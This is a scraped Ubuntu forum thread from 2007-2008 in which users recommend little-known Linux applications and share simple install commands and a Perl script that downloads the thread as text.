If you need any help with setting it up for GMail, just pm me.I was intrigued by Alpine after a post of yours in that other [forum]("http://bbs.archlinux.org") and have been playing around with it since. It's a great piece of software, indeed.

If all you want is a simple configuration, you can have it, but its spectrum of options is incredibly powerful. Nothings was left at random there. I do still love ***mutt*** and will keep on using it (I didn't set a chronjob for getting mail - I just type SHIFT+G to get mail whenever I want to, or type "getmail" at the terminal) but Alpine looks like a very interesting alternative. A few people have had problems using mutt with Gmail, but I've been using a very straightforward config which is working perfectly with it. (getmail for getting and msmtp for sending)

Regarding Alpine, they just released it under the Apache license, in what is supposed to be a "fork" of the original Pine (what with all the controversies with the FSF regarding licensing and all).

I definitely second this recommendation here :)

Also, dunno if it's been mentioned (this thread is hard to follow, sometimes), but [Gpicview]("http://lxde.sourceforge.net/gpicview/") is a quick & light image viewer, which is developed by PCMan of [PCManFM]("http://pcmanfm.sourceforge.net/") fame. He claims he's not a software developer but his software is always top notch ;)

### Post by erykroom on 2007-12-30
Im not sure if someone has mentioned it before 

[cmus]("http://cmus.sourceforge.net/")  - a small and fast console audio player

### Post by Phrawm48 on 2007-12-30
** xclip** - command line interface to X selections (clipboard)

*xclip* reads  from  standard in, or from one or more files, and makes the data available as an X selection for pasting into X applications.  Prints current X selection to standard out.

*xclip*'s uses are many.  I use *xclip* in conjunction with a Gnome* Drawer* panel widget to quickly paste regularly used strings, such as a formatted date string.

For example, to paste *123456789* into a form field, I first create a script that contains the following:

```
echo "123456789" | xclip -selection clipboard
```In the Gnome panel, I then add a launcher for the script to the *Drawer* widget.  When I want to paste the string I  click the drawer, then choose the appropriate script's icon.  *Xclip* places the string specified by the script into my clipboard (well, actually the current Klipper entry...)

Cheers & hope this helps,
Ric
SFO

### Post by Mithrilhall on 2007-12-31
**_[Minicom]("http://linux.die.net/man/1/minicom")_** - is a communication program which somewhat resembles the shareware program TELIX but is free with source code and runs under most unices. Features include dialing directory with auto-redial, support for UUCP-style lock files on serial devices, a seperate script language interpreter, capture to file, multiple users with individual configurations, and more.

Please refrain from posting unless you are certain your answer is correct.  Incorrect information is worse than no information. ### Post by FuturePilot on 2008-01-01
Gmount-iso.
This is a really handy little tool that lets you mount .iso files. It's especially handy if you don't know how to do it from the terminal.
```
sudo apt-get install gmountiso
```

### Post by dannyboy79 on 2008-01-09
> **bren said:**
> pokerth 0.6 (download chmod +x and install .bin yourself as 0.5 is current version in repositories)

open source texas holdem poker game

are you saying that this is a windows file and has to be installed in wine? what do you mean by install the .bin yourself? i have been looking for online poker for linux for awhile. i got a few to work through wine but there's still glitches.

---

### Post by ::: on 2008-01-10
> **dannyboy79 said:**
> are you saying that this is a windows file and has to be installed in wine? what do you mean by install the .bin yourself? i have been looking for online poker for linux for awhile. i got a few to work through wine but there's still glitches.
No. A *.bin has nothing to do with wine. It's a native linux executable. It just means you don't install it throug a packet manager.
So, go to the console and type in something like:
```
chmod +x something.bin
./something.bin
```
The first line makes the file executable (gives it the permission to be executed) and the second line executes it.

---

### Post by brunovecchi on 2008-01-13
Ok. After 2 days, i've read every single post of this wonderful thread.
It was quite a journey!
keepers: Tilda (Guake is slicker but is not as functional yet), Qalculate! (simply awesome), dvdisaster, pdfedit, xournal.

My contribution (all of them in repos):
**Jabref:** bibliography manager. It can connect to common bibliography databases like Medline and automatically retrieve articles. Manages several bibliography formats (EndNote included) and pipes easily with LyX.
**Dia:** diagram editor. Very useful for mindmaps.
**[_[COLOR="Navy"]Scorched3D[/COLOR]_]("http://www.scorched3d.co.uk/")**. ¿Remember scorched earth? This is the 3D remake of that old classic. It's excellent, awesome graphics and allows network multiplayer.
**Gniall:** (official description)
*gNiall attempts to learn whatever language you try to teach it. It is basically a dissociator: it collects statistics on sentences you type and tries to construct meaningful replies. gNiall is inspired by Niall, and Amiga program by Matthew Peck.*
I've been talking to that nice buddy (whacko) for a couple of days now; it's much better than Emacs' phsychiatrist.
[B]
espeak:[/B] [I]eSpeak is a software speech synthesizer for English, and some other
languages.

eSpeak produces good quality English speech. It uses a different synthesis
method from other open source text to speech (TTS) engines, and sounds quite
different. It's perhaps not as natural or "smooth", but some find the
articulation clearer and easier to listen to for long periods.[/I]

It's awesome, and has a brittish accent! I just added this to my crontab:

```
$ while [ 0 ]; do espeak "get up you lazy bum, get up get up"; done
```

at 7 AM every week day.:lolflag:

### Post by p_quarles on 2008-01-16
In another thread I was just reading, there was a tiny bit of confusion when one of my fellow Americans posted a temperature in Fahrenheit, and someone from the rest of the world wasn't sure how that translated. 

This led me to think that there *must* be some simple tool for *nix that can convert units, and there is! Of course, there are a billion ways of converting units, but I love little CLI tools like this:
```
sudo apt-get install units
```
Then:
```
me@me:~$ units
2438 units, 71 prefixes, 32 nonlinear units

You have: tempfahrenheit(38)
You want: tempcelsius
        3.3333333
You have: 
```
Well, *I *think it's cool.

---

### Post by olejorgen on 2008-02-01

> 
Description: Tetris-like game with very impressive effects
Cuyo, named after a Spanish relative adjective, shares
with tetris that things fall down and how to navigate them.
When enough "of the same type" come "together", they explode.
The goal of each level is to blow special "stones" away, you
start with. But what "of the same type" and "together" means,
varies with the levels.

Linux ric-desktop 2.6.20-16-generic #2 SMP Tue Dec 18 05:45:12 UTC 2007
One Intel Pentium 4 2020MHz processor, 4043.73 total bogomips, 1011M RAM

### Post by ubuntu27 on 2008-02-03
[Workrave]("http://www.workrave.org/")

Workrave is a program that assists in the recovery and prevention of repetitive strain injury (RSI). The program frequently alerts you to take micro-pauses and rest breaks, and restricts you to your daily limit.

You would have to compile from source in order to install Workrave.
Ubuntu users can get a Deb from [GetDeb.net]("http://getdeb.net/app/Workrave")

There is also a Windows binary at [Workrave]("http://www.workrave.org/")


NOTE: This programs uses gtk and it is depends on some GNOME libraries.

### Post by olejorgen on 2008-02-07
Enough with the browser war allready. (opera is of course best. and that it's "worst" is stupid FUD) :)

**atool** archive tool. Handles most formats. (might been mention allready)
> Description: A tool for managing file archives of various types
 atool is a script for managing file archives of various types (tar,
 tar+gzip, zip etc). The main command is probably aunpack,
 extracting files from an archive. It overcomes the dreaded "multiple
 files in archive root" problem by first extracting to a unique
 subdirectory, and then moving back the files if possible. aunpack
 also prevents local files from being overwritten by mistake.
 .
 Other commands provided are apack (create archives), als (list files
 in archives), and acat (extract files to standard out).
 .
 Homepage: [http://www.nongnu.org/atool](http://www.nongnu.org/atool)

### Post by TeaSwigger on 2008-02-08
I couldn't say as to the soundness of its methodology or results, but the command-line utility cdck scored some interest in Linux realm from my sis; she'd said, "Too bad you couldn't verify a disc (data CD or data DVD) after a burn," implying to check its current integrity in some way. ### Post by julian67 on 2008-02-08
> **TeaSwigger said:**
> I couldn't say as to the soundness of its methodology or results, but the command-line utility cdck scored some interest in Linux realm from my sis; she'd said, "Too bad you couldn't verify a disc (data CD or data DVD) after a burn," implying to check its current integrity in some way. So's I says, "there does seem to be something on my Linux setup here..."

k3b has been able to do this for a long time, i.e. when burning a disk image it will checksum the iso to be burned, then checksum the burned CD/DVD and let you know if the burn was good. Brasero has become able to do this in recent versions too, automatically if you like.

### Post by Bartender on 2008-02-09
Several folks mentioned hugin over the last few pages.  Would like to mention that there are add-ons for hugin that make it even cooler.

autopano or autopano-SIFT will automatically find control points for you.
enblend helps blend the images where they meet up.  

I think - not sure yet, just started playing with this stuff a few days ago - that enblend only kicks in when you go into hugin's "Stitcher" tab, choose "Quick Stitch", and tell it to save as high-quality TIFF.
enblend and autopano available from repo's, then you go into hugin's "Preferences" window, find the "Autopano" and "enblend" tabs, and activate them.  That's the rough version, sorry, I didn't take good notes.
There are Windows versions of all the above.  But it's easier to set it all up in Ubuntu than Windows!

I thought the Pandora addon for GIMP works pretty good, too, but hugin has more features and it looks like you could spend hours playing with them.
[http://hugin.sourceforge.net/tutorials/index.shtml](http://hugin.sourceforge.net/tutorials/index.shtml)

### Post by Phrawm48 on 2008-02-16
'though it may not be in the Ubuntu repositories, I think it's appropriate to add *btnx* to this thread.

For a start, here's an overview of *btnx*: [http://www.linux.com/feature/126295](http://www.linux.com/feature/126295)

From that page (underlining added): [I]btnx comes in two parts: the btnx daemon that does the behind-the-scenes work of managing mouse button events, and the btnx-config tool, _a graphical front end that helps you configure mouse button actions_.
[/I]
That page in turn includes a link to the *btnx* home page: [http://www.ollisalonen.com/btnx/](http://www.ollisalonen.com/btnx/)

I wasn't able to get the third-party *.deb* packages available from the site to work on Ubuntu Feisty, so I used the *btnx *Web site's [installation instructions]("http://www.ollisalonen.com/btnx/man/btnx-manual.html#AEN97") to download the source, and installation scripts and use them.

One little "gotcha" then occurred because the *btnx *installation script didn't create the */etc/btnx/* directory and copy *btnx*'s mouse-buttons *events* file into that directory.  So I did that part manually, paying attention to root ownership of the directories and files, and everything started working beautifully...

Cheers & hope this helps,
Ric
SFO

---

### Post by urukrama on 2008-02-18
I know it has been mentioned before, but [catfish]("http://software.twotoasts.de/?page=catfish") is a nice file searcher. It is light, fast and doesn't have unreasonable dependencies. It is a frontend for several search utilities, and you can easily switch between search tools.

I've just recently started using it, and like it much better than the search tools I used in the past. I rarely need it, but it is handy when you *really* can't find a certain file.

### Post by AncientPC on 2008-03-02
preload:
> Package: preload
State: installed
Automatically installed: yes
Version: 0.4-4
Priority: optional
Section: universe/misc
Maintainer: Ubuntu MOTU Developers <ubuntu-motu@lists.ubuntu.com>
Uncompressed Size: 176k
Depends: libc6 (>= 2.5-0ubuntu1), libglib2.0-0 (>= 2.12.9)
[b]Description: adaptive readahead daemon
 preload monitors applications that users run, and by analyzing this data,
 predicts what applications users might run, and fetches those binaries and
 their dependencies into memory for faster startup times. 
 
 Note that installing preload will not make your system boot faster and that
 preload is a daemon that runs with root priviledges. [/b]
 
 Homepage: [http://preload.sourceforge.net/](http://preload.sourceforge.net/)

Think SuperFetch for Vista, except that Preload has been around for 10 years.

### Post by ubuntu27 on 2008-03-03
[Castle-Combat]("http://user.cs.tu-berlin.de/~karlb/castle-combat/")

This is such a fun game that I just discovered recently. I am playing with my sister almost everyday now thank to this game :) The game is simple, yet it takes a little while to master :D

Look like it has network or multiplayer support, but nobody connects to it. This game is not that famous. That should change!

It is in Debian Sid's Repositories, I don't know it it is in Ubuntu's repositories.

```
apt-get install castle-combat
```

> [Castle-Combat]("http://user.cs.tu-berlin.de/~karlb/castle-combat/") is a clone of the old arcade game [Rampart]("http://en.wikipedia.org/wiki/Rampart_(arcade_game)"). Up to four players (or more in future versions) build castle walls, place cannons inside these walls, and shoot at the walls of their enemy(s). If a player cannot build a complete wall around one of his castles, he loses. The last surviving player wins.

gNiall attempts to learn whatever language you try to teach it. It is

### Post by phillywize on 2008-03-25
Ok, here's one that I KNOW no one's heard of because it just got written by two kind, excellent, and talented members of ubuntuforums:  syadnom and tinivole:

ps2pdfd is a small daemonized bash script that creates in and out folders for postscript (.ps) files.  You can drop (or print) a .ps file into the in folder, and it will automatically generate a pdf in the out folder. Get it here:

[http://ubuntuforums.org/showthread.php?p=4586858](http://ubuntuforums.org/showthread.php?p=4586858)

### Post by dmgExP on 2008-03-27
Gamers may want to try [COLOR="RoyalBlue"]xmame[/COLOR].

[COLOR="Green"]MAME[/COLOR] is the Multi-Arcade-Machine-Emulator.  It re-creates retro arcade games from the 70's and 80's.

After installing [COLOR="RoyalBlue"]xmame[/COLOR] you need to grab the games off the internet -- they are all tiny files copied off the ROMS in the original machines and readily available for download from many sites.

*(The games are still the property of their authors-- Sega, Namco, Bally etc. and therefore using them may be illegal -- they do not come bundled with xmame.)*

Games to look for:

Chase:-  Pacman, Ms. Pacman
Maze:-  Diamond Run, Toffy, Lode Runner
Shootup:-  1942, 1943, Galaga, Gaplus, Gemini Wing
Silly:-  Donkey Kong Jr, Bagman, Arabian

You will find games that don't play on this version of mame, yet they worked on an earlier version -- every new mame release has it's own quirks.  The Ubuntu team is not responsible for [the MAME project]("http://www.mame.net"), they simply package it for you to enjoy.

It does have a downside, operating through the console interface and a somewhat quirky setup.

---

### Post by revpfil on 2008-04-22
Not an application per se, but I can't live without the LaTeX plugin for gedit. It turns gedit into a full LaTeX ide, with build, auto complete, highlighting, all the good stuff.

As for actual apps, um... LaTeX. Texlive is in the repositories, is a full featured implementation of LaTeX [more than full... be prepared to wait a while if you install the full version :) ]. LaTeX is by far the best way to write any kind of document. Slightly less complicated that html :), it lets you do professional quality typesetting. It has built in styles for books, reports, articles, and letters, so it can handle every day writing or advanced mathematics (advanced mathematicians already know what I'm talking about, though). Basically, if you use Ubuntu for school, work, hatemail to M$, anything that involves writing, LaTeX is really the way to go.

---

### Post by unutbu on 2008-04-24
I know what you're thinking -- linux has every cool app I will ever need... except, wait a minute... How do I download this 'cool apps' thread as a text file so I can search and/or print it? 

```
#!/usr/bin/perl
# Usage:
# dl-ubuntuforum-thread.pl "http://ubuntuforums.org/showthread.php?t=442945" 
use strict;
use warnings;

my $thread=shift @ARGV;
warn "thread=$thread\n";
my $page=1;
my $current_page;
my $max_page=2;
my $cmd;
my ($thread_num)=($thread=~m/\?t=(\d+)/);
warn "thread_num=$thread_num\n";
while (1) {
    last if ($page>$max_page);
    $cmd="wget -O thread${thread_num}-${page}.html \"http://ubuntuforums.org/printthread.php?t=$thread_num&pp=75&page=${page}\"";

    print "$cmd\n";
    system($cmd);
    open(FILE,"<","thread${thread_num}-${page}.html") || die; 
    while (<FILE>) {
	if (/Page (\d+) of (\d+)/) {
	    ($current_page,$max_page)=($1,$2);
	    print "Page $current_page of $max_page\n";
	    last;
	}
    }
    close(FILE);
    $cmd="lynx -dump thread${thread_num}-${page}.html > thread${thread_num}-${page}.txt";
    print "$cmd\n";
    system($cmd);
    $page++;
}

$cmd="cat " . join(' ', map {"thread${thread_num}-${_}.txt"} (1..$max_page)) . "> thread${thread_num}.txt";
print "$cmd\n";
system($cmd);

for $page (1..$max_page) {
    for my $ext (qw(txt html)) {
	my $file="thread${thread_num}-${page}.${ext}";
	$cmd="unlink($file)";
	print "$cmd\n";
	unlink($file);
    }    
}

$cmd="bzip2 thread${thread_num}.txt";
system($cmd);
```

Save it to a file called 'dl-ubuntuforum-thread.pl'.
Make it executable:
```

chmod 755 dl-ubuntuforum-thread.pl
```
and run it like this:

```
dl-ubuntuforum-thread.pl http://ubuntuforums.org/showthread.php?t=382137
```

Requires perl, wget, lynx, bzip2. Outputs a file called 
'thread382137.txt.bz2'.

Edit: the script can now download any ubuntuforum thread. Just go to the first page of the thread and copy/paste the url into the command above.

### Post by Onyros on 2008-04-25
> **Tsukino Kyuuketsuki said:**
> I don't think anyone mentioned **XMMS** yet, that's the perfect winamp alternative. Found it on the repos.... and once you upgrade to Hardy, you will no longer find it in the repos.

Someone will then tell you to try Audacious instead. Which looks the same, but it stops at that - because audio playback with Audacious sucks a lot more CPU and RAM.

It's a matter of policy - doesn't matter if it works well for whoever still wants to use it, doesn't matter if it's the most lightweight and yet perfectly functional package with no major bugs: if it's unmaintained, it's dropped.

You can always compile it yourself, holler if you need help :)

### Post by lazyart on 2008-04-28
6 days later I finally finished this thread.  Lots of great stuff--thanks to all.

+1 for:

apwal - My goodness this is the coolest app around.  I bound my mouse wheel click to it and bam! Instant access to frequently used apps.  Take it another step and add an icon to apwal's menu to let to quickly reconfigure it.

alltray - Get thunderbird and j-pilot (or any app) out of the way (and into the tray) until I need them.

sysinfo - Although I found it before I found this thread, sysinfo gives much better info than the stock "Hardware Info"

glipper - ever close a window after copying something to the clipboard?  Ooops- it removes the item from the clipboard.  Glipper will remember it for you (as long as it's text).  You can even set how many entries you wish to recall.

And my meager addition:

It's not an app but a nautilus plug-in.  ```
sudo apt-get install nautilus-open-terminal
killall nautilus
```(the second line is necessary to restart nautilus and make the plug-in work.)
Right click on an empty area in nautilus and you'll have the option to open the terminal from that directory.

### Post by Cannaregio on 2008-05-02
Dunnow if somebody already mentioned it, didn't read all of this interesting thread yet, but I discovered recently

[COLOR="Blue"][SIZE="4"]gmemusage[/SIZE][/COLOR] 

```
sudo apt-get install gmemusage
```
a wondrous little graphic utility that allows you to see at once who is using most memory on your system: in fact it shows you the relative proportions of memory used by running processes (updated in real time). 

Individuate at once all bad programs that "hog" memory!

### Post by brunovecchi on 2008-05-03
> **unutbu said:**
> I know what you're thinking -- linux has every cool app I will ever need... except, wait a minute... How do I download this 'cool apps' thread as a text file so I can search and/or print it? 

```
#!/usr/bin/perl
use strict;
use warnings;

my $page=1;
my $current_page;
my $max_page=2;
my $cmd;
while (1) {
    last if ($page>$max_page);
    $cmd="wget -O cool-unknown-programs${page}.html \"http://ubuntuforums.org/printthread.php?t=382137&pp=75&page=${page}\"";

    print "$cmd\n";
    system($cmd);
    open(FILE,"<","cool-unknown-programs${page}.html") || die; 
    while (<FILE>) {
	if (/Page (\d+) of (\d+)/) {
	    ($current_page,$max_page)=($1,$2);
	    print "Page $current_page of $max_page\n";
	    last;
	}
    }
    close(FILE);
    $cmd="lynx -dump cool-unknown-programs${page}.html > cool-unknown-programs${page}.txt";
    print "$cmd\n";
    system($cmd);
    $page++;
}

$cmd="cat " . join(' ', map {"cool-unknown-programs${_}.txt"} (1..$max_page)) . "> cool-unknown-programs.txt";
print "$cmd\n";
system($cmd);

for $page (1..$max_page) {
    for my $ext (qw(txt html)) {
	my $file="cool-unknown-programs${page}.${ext}";
	$cmd="unlink($file)";
	print "$cmd\n";
	unlink($file);
    }    
}

```

Requires perl, wget, lynx. Outputs a file called 'cool-unknown-programs.txt'.

Thanks a lot! It worked perfectly. Really useful.

### Post by conehead77 on 2008-05-03
**unclutter**

**unclutter**  removes the cursor image from the screen so that it does not obstruct the area you are looking at after it has not moved for a given time.  It does not do this if the cursor is in the root
       window or a button is down.  It tries to ignore jitter (small movements due to noise) if you have a mouse that twitches.

```

unclutter -idle 1

```
sets the time for removing the mouse icon to 1 second for example.

---

### Post by chris4585 on 2008-05-04
**gcal** is a command line calendar, very straight forward and nice.

[screenshot here]("http://i26.tinypic.com/148qhyt.jpg")

from synaptic

[I]Prints calendars
Gcal displays a calendar for a month or a year, eternal holiday lists
and fixed date lists, in many ways. The program correctly omits the
dates that were skipped when the current Gregorian calendar replaced
the earlier Julian calendar.

Apart from the usual and well known calendar functions like the
output of a month or a year calendar sheet, or the output of an eternal
holiday list, Gcal offers the facility to display fixed dates on the
day of their occurrence and to remind or inform the user about them.
So it's imaginable after booting the computer or starting the work
session, that the user is informed on screen or by means of electronic
mail, about all holidays or appointments which are observed or
scheduled for that day.[/I]

---

### Post by Maupertus on 2008-05-04
[Tasque](http://live.gnome.org/Tasque) is a great tool that's still under heavy development, but is quickly replacing TomBoy as my favorite GTD application. I especially like the evolution and [remember the milk integration.](http://www.rememberthemilk.com/)

It's not in the reps, so:
[quote=Tasque-project]
$sudo gedit /etc/apt/sources.list

then add:
 
[i]## Tasque PPA
deb [http://ppa.launchpad.net/tasque-packagers/ubuntu](http://ppa.launchpad.net/tasque-packagers/ubuntu) hardy main[/i]

$sudo apt-get update
$sudo apt-get install tasque
[/quote]

Also it's strange I hear so little of it here on the forums...but Gnome-Do rocks my socks every time I use it.
I recently installed AWN, and the combination of the two gives so much power to the keyboard user. (And it makes your desktop more beautiful as wel ;) I wish I can emote how much I love it. It's in the rep's since Hardy and needs a bigger shout so here's mine.

[GNOME-DO!!!](https://wiki.ubuntu.com/GnomeDo)

Owh, and for Gutsy, just add:


deb [http://ppa.launchpad.net/do-core/ubuntu](http://ppa.launchpad.net/do-core/ubuntu) gutsy main
deb-src [http://ppa.launchpad.net/do-core/ubuntu](http://ppa.launchpad.net/do-core/ubuntu) gutsy main


to your sources list.

---

### Post by dmgExP on 2008-05-04
Looking for a good backup utility that has good compression and archive splitting?  Then investigate **[COLOR="Magenta"]7-ZIP[/COLOR]**

**install:** [FONT="Arial"]p7zip-full[/FONT]

7-zip is an archiving utility that offers the best possible compression.  It also does archive-splitting.  It uses *.7z archive format and handles other formats too. 

**Example backup with 7zip:**

[INDENT]tar -cf - .|7za a *[FONT="Courier New"]archive_name.7z[/FONT]* -si -mx9 -v700m -bd[/INDENT]

[FONT="Arial Narrow"][SIZE="1"]My example uses maximum compression (-mx9) and splits the archive into 700MB volumes (-v700m)[/SIZE][/FONT]

Test Results on one file: Gzip:31.58%, Bzip:32.5%, 7z:33.86%.
Compression levels for a complete system backup are very impressive.

It is best to boot a live-cd when doing system backups.  [PCLinuxOS]("http://www.pclinuxos.com/") has a utility (mklivecd) that makes doing it simple.

---

### Post by brunovecchi on 2008-05-10
This two haven't been mentioned yet:

**PyRoom:** a text editor based on Mac's Writeroom. It's focused on achieving the user's concentration by providing an unobtrusive writing environment. The interface lacks any button or menu. Moreover, it blocks out everything else in the screen to minimize distraction. It is aimed at writing, not at coding, although it's being discussed whether to allow LaTeX syntax highlighting.

**[http://pyroom.org/]("http://pyroom.org/")**

**Unp:** a Perl script that unifies the extraction of compressed archives into a single command. No matter what the format is (tar[.gz,.bz2], gz, bz2, Z, ar/deb, rpm, shar, rar, arj, zip, LHa, cab, ace, tnef, uu (mail, news), mime, hqx, sea, zoo, pmd, cpio, afio, lzop), you unpack with ```

unp filename(s)
```
Quite useful, right? This one is in the repos.

---

sticky note application for X

### Post by DJ_Peng on 2008-05-12
I've used sysinfo for a year now and love it. For someone coming from WinXP it's a great tool to take the place of Norton's SysInfo, and it's the best way I've found yet to be able to get at the specifics of your hardware installation. I can't tell you how many times I've used it in connection with support forum issues and it's always been the perfect tool for the job. Now even if I don't *need* it I make sure it gets included in a reinstall and when I set up a friend's computer with Ubuntu I make sure they get it as well.

### Post by ubuntu27 on 2008-05-12
[Bos Wars]("http://www.boswars.org/").- **a Futuristic RTS Game that is Free Open Source.**

Bos Wars has a dynamic rate based economy. Energy is produced by power plants and magma gets pumped from hot spots. Buildings and mobile units are also built at a continuous rate. Control of larger parts of the map creates the potential to increase your economy throughput. Holding key points like roads and passages allow for different strategies.

It is possible to play against human opponents over LAN, internet, or against the computer. 
Bos Wars successfully runs under GNU/Linux, MS Windows, BSD, and Mac OS X. 

[http://www.boswars.org/](http://www.boswars.org/)

---

### Post by chucky chuckaluck on 2008-05-12
> **Mud.Knee.Havoc said:**
> 1. screen

Screen lets you run a number of different terminal windows in one, even letting you use a split-screen to display two terminals in one window.  If you use a lot of different command line programs or terminal windows, you need screen!

well, i suppose it was foolish of me to hope no one had mentioned it yet. another +1 for screen. when i first start using an app that's new to me, i read about two inches into the man page and just start using it. one day, i was ripping a bunch of streams and listening to some music, in x, all in one terminal (using screen, of course). i did ctrl+alt+backspace (the classy way to exit x) and noticed the music was still playing ("how do you keep the music playing?" well, now you know, monsieur legrand.). as i was using cplay, and not mpd, i found this odd. when i opened up htop, i saw that screen was still running. this sent me back to the man page and into a delirious new love affair.

### Post by unutbu on 2008-05-15
There is dia:
>  Dia is an editor for diagrams, graphs, charts etc. There is support for UML
 static structure diagrams (class diagrams), Entity-Relationship diagrams,
 network diagrams and much more. Diagrams can be exported to postscript and
 many other formats.

I don't know if its any good -- I found it by typing
```
apt-cache search diagram
apt-cache show dia

```

You can type `apt-cache search <anything>` to find packages that have something to do with <anything>. 

Once you find the name of a package, you can type 

`apt-cache show <package name>` to find out more.

They are two very useful commands, which I might even call cool applications...

### Post by chochem on 2008-05-15
(Search this thread yields nothing, okay so here goes...) 
As selfappointed head of PIFOBOP (people in favour of banishing omnipresent panels), I'd suggest **[visibility]("http://ubuntuforums.org/showpost.php?p=3168072&postcount=17")**, a stand-alone pager-like thing (the pager's the representation of your workspaces in your panel). You've probably not heard of it as there's no development, no documentation, and no package in the repos... but picpac has kindly supplied a package and [here]("http://ubuntuforums.org/showpost.php?p=4834950&postcount=18")'s a sample config file. Also in that line is **stalonetray**, a stand-alone-system-tray. It's in the repos.

**VLC** is anything but something you might not have heard about and it's still got eight mentions in this thread. However, I recently found out that apart from all the other things it does better than all the other media players, it also works brilliantly as a webcam displayer/recorder. If you're not on Gnome, stuff like 'Cheese' is a depedency nightmare, so why not use what you've already installed? Oh VLC, is there anything it can't do?

### Post by calraith on 2008-05-18
Wow, I just read that whole thread.  Lots of repeats (yes tilde and scite have already been mentioned)!  Allow me to repeat a few more, as well as add a few:

**Apps I either didn't see on the list or saw but thought important enough to mention again:**

[LIST]
[*][kdirstat]("http://kdirstat.sourceforge.net/") -- graphical representation of hard drive usage (in repos)
[*][iftop]("http://images.google.com/images?q=iftop") -- console curses based gui showing you the source / destination of your biggest bandwidth leeches (similar to jnettop, but a little more polished; in repos)
[*][devede]("http://www.rastersoft.com/programas/devede.html") -- convert movie files to VCD / SVCD / DVD format (version in in repos is obsolete -- get it from [GetDeb]("http://www.getdeb.net/app/DeVeDe"))
[*][sound-juicer]("http://en.wikipedia.org/wiki/Sound_Juicer") -- rip audio CDs to MP3, Ogg or FLAC (in repos)
[*][xcruise]("http://images.google.com/images?q=xcruise") -- Imagine your filesystem is a galaxy.  Now imagine yourself flying from solar system to solar system as you navigate your folders.  Old school 3D graphics and useless, but still amusing. (in repos)
[*][wicd]("http://wicd.sourceforge.net/screenshot.php") -- replacement for Gnome's nm-applet for managing networks.  After installing it and setting /opt/wicd/tray.py to autostart in Sessions, it took about 30 seconds for me to figure out how to connect to my university's 802.1x network.  Unlike nm-applet, wicd has the benefit of not annoying you for a password every time it connects to a stored network. (see [this page]("http://wicd.sourceforge.net/download.php") for easy installation instructions)
[*][Regnum Online]("http://www.regnumonline.com.ar/index.php?l=1") -- free MMORPG with a focus on king-of-the-hill style PvP play in higher levels.  Like Evercrack or World of Warcrack without the subscription fees.  Premium items can be bought, but are not required to progress.  (requires free registration -- download installer from [Regnum Online]("http://regnumonline.com.ar/index.php?l=1&sec=6") website
[*][fail2ban]("http://www.fail2ban.org/") -- log watchdog that temporarily blocks brute force attackers with a firewall rule.  By default it protects sshd, but it can be configured to protect ftp, apache, and any other services that log authentication failures.  If you run an ssh, ftp, or any other password-protected server, **you need this**. (in repos)
[/LIST]
        

**Apps I saw in this thread, tried, and kept:**

[LIST]
[*] gkdebconf -- graphical interface to dpkg-reconfigure, allows browsing for apps that can be dpkg-reconfigured.  (in repos)
[*][vym]("http://debaday.debian.net/2008/01/27/vym-view-your-mind-easy-mind-mapping-and-drafting-tool/") -- view your mind, a mind mapper
[*] dvdisaster -- lets you create an ISO of the undamaged portion of optical media for recovery, or create recovery records for good discs so that when they do deteriorate or get damaged, they can be rebuilt.  (This part doesn't make a whole lot of sense to me.  Usually, one migrates data from a hard drive to an optical disc in the backup process -- not the other way around.  0_o  Oh well, it's in the repos.)
[*][xournal]("http://xournal.sourceforge.net/") -- note taker, especially sexy if you have a tablet input device (in repos)
[*][smw]("http://smw.72dpiarmy.com/") -- super mario war, a multiplayer game with no network support (two people on one keyboard)
[*][Teeworlds]("http://www.teeworlds.com/") -- multiplayer game of some sort.  I haven't played it yet, but it appears to be a cross between a multiplayer FPS like Quake or Unreal, but in a cartoonish 2D platform.
[*] blast -- blast holes in whatever window is pissing you off (in repos)
[*][pyrenamer]("http://www.infinicode.org/code/pyrenamer/") -- nice renamer, similar to FlexRename in Windows (in repos)
[*] apt-file -- console tool which lets you search files in packages, so you can figure which package contains some obscure file you can't find otherwise.  Useful if you're doing the ./configure --> make --> sudo checkinstall thing.  (in repos)
[*][keyjnote]("http://keyjnote.sourceforge.net/") -- view PDFs as presentations with 3D effects (in repos)
[*][tdfsb]("http://images.google.com/images?q=tdfsb") -- another useless old school 3D filesystem browser with a slightly different perspective (walking rather than flying).  tdfsb does have support for playing music files and rendering images, which does make navigating your archived porn collection a little more interesting.  (in repos)
[/LIST]

---
